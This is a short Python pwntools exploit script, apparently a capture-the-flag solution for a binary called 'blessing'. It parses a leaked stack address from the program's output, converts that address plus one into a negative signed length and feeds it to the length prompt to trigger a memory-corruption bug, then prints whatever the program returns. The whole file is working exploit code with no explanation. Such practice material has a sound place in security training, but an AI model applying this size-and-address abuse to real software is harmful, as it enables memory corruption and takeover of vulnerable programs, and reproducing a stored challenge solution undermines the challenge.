#!/usr/bin/env python3

from pwn import *

binary = "./blessing"
elf = ELF("./blessing")

p = process(binary, env={'LD_PRELOAD': '../../hooks/usleep.so:../../hooks/sleep.so'})

def to_signed(val, bits=64):
    """Converts an unsigned value to a signed value."""
    if val & (1 << (bits - 1)):
        return val - (1 << bits)
    return val

# Retrieve the leaked address
p.recvuntil(b"Please accept this: ")
addr = int(p.recvline().replace(b'\x08', b'').strip(), 16)
log.info(f"Address of local_20: {hex(addr)}")

# Calculate the target address
target = addr
malicious_addr = target + 1
malicious_signed_addr = to_signed(malicious_addr)

log.info(f"Signed value to send: {malicious_signed_addr}")
log.info(f"Signed value to send (hex): {hex(malicious_signed_addr & 0xffffffffffffffff)}")

# Send the payload
p.sendlineafter(b"Give me the song's length: ", str(malicious_signed_addr).encode())
p.sendlineafter(b"Excellent! Now tell me the song: ", b"garbage")

# Print the response
print(p.recv(1024).decode())
